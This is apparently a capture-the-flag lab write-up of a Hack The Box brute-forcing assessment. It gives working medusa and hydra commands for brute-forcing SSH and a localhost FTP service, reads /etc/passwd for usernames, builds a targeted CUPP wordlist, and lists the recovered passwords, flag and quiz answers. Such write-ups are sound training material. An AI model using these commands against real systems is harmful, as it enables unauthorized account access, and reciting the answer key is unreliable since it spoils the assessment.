# Section 13 — Skills Assessment Part 2

---

## Objective

Using the SSH username from Part 1 (`satwossh`), brute-force SSH, pivot inside to find and crack an internal FTP service, and retrieve flag.txt.

---

## Full Attack Chain

```
Brute-force SSH (satwossh) → SSH in → find thomas in /etc/passwd → 
CUPP wordlist for Thomas Smith → brute-force FTP on localhost → get flag
```

---

### Step 1 — Brute Force SSH

```bash
medusa -h TARGET_IP -n TARGET_PORT -u satwossh \
  -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  -M ssh -t 3 -f
```

**Result:** `satwossh:password1`

---

### Step 2 — SSH In and Enumerate

```bash
ssh satwossh@TARGET_IP -p TARGET_PORT
```

```bash
# Find internal services
netstat -tulpn | grep LISTEN    # port 21 open on localhost

# Find FTP username hint
cat /etc/passwd | grep -v nologin | grep -v false
# thomas:x:1001:1001::/var/.hidden:/bin/bash  → username is thomas
```

---

### Step 3 — Build CUPP Wordlist for Thomas Smith

The OSINT clue in the module reveals the target is **Thomas Smith**. Generate a password list:

```bash
# On your attacker machine
printf "Thomas\nSmith\n\n\n\n\n\n\n\n\n\n\ny\nchocolate\ny\ny\ny\nn\n" | python3 cupp/cupp.py -i
# Output: thomas.txt
```

> **Key detail:** `chocolate` is a keyword tied to Thomas — without it the list misses `chocolate!`. OSINT on the target is critical for CUPP to work.

---

### Step 4 — SCP Wordlist to Target and Brute Force FTP

```bash
# Copy wordlist to target
sshpass -p 'password1' scp -P TARGET_PORT thomas.txt satwossh@TARGET_IP:/tmp/thomas.txt

# Run hydra from inside the SSH session against localhost FTP
sshpass -p 'password1' ssh -o StrictHostKeyChecking=no -p TARGET_PORT satwossh@TARGET_IP \
  "hydra -l thomas -P /tmp/thomas.txt ftp://127.0.0.1 -f -t 5"
```

**Why SCP + run inside:** FTP is only on localhost — not reachable externally. SSH tunnels are unstable for Hydra. Copying the list and running from inside is the most reliable approach.

**Result:** `thomas:chocolate!`

---

### Step 5 — Retrieve the Flag

```bash
sshpass -p 'password1' ssh -o StrictHostKeyChecking=no -p TARGET_PORT satwossh@TARGET_IP \
  "python3 -c \"
import ftplib
ftp = ftplib.FTP()
ftp.connect('127.0.0.1', 21)
ftp.login('thomas', 'chocolate!')
lines = []
ftp.retrlines('RETR flag.txt', lines.append)
print('\n'.join(lines))
ftp.quit()
\""
```

**Why python3 ftplib:** No `curl` on the target, and `ftp -n` heredoc has passive mode issues. Python's `ftplib` works reliably non-interactively.

**Result:**
```
HTB{brut3f0rc1ng_succ3ssful}
```

---

## Answers

**Q1 — FTP username:** `thomas`
**Q2 — Flag:** `HTB{brut3f0rc1ng_succ3ssful}`

---

## Lessons Learned

- Always check `/etc/passwd` after getting a shell — reveals usernames for other services
- CUPP needs the right keywords — generic name-only lists miss targeted passwords like `chocolate!`
- FTP on localhost = copy your wordlist to the target via SCP, run the attack from inside
- SSH tunnels are unreliable for sustained brute-force — avoid when possible
